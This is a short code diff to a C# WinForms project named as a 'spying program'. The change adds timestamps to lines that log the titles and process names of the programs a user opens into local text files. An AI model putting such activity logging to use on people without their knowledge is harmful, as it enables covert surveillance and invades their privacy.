@@ -118,8 +118,8 @@ namespace project_WinForm_spying_program
             {
                 Directory.CreateDirectory(processSaveFolder);
             }
-            File.AppendAllText(titleSaveFolder + "programTitle.txt", title + ", ");
-            File.AppendAllText(processSaveFolder + "processOpened.txt", processName + ", ");
+            File.AppendAllText(titleSaveFolder + "programTitle.txt", title + ", Time: " + DateTime.Now.ToString() + '\n');
+            File.AppendAllText(processSaveFolder + "processOpened.txt", processName + ", Time: " + DateTime.Now.ToString() + '\n');
         }
 
         private void checkBannedWords()
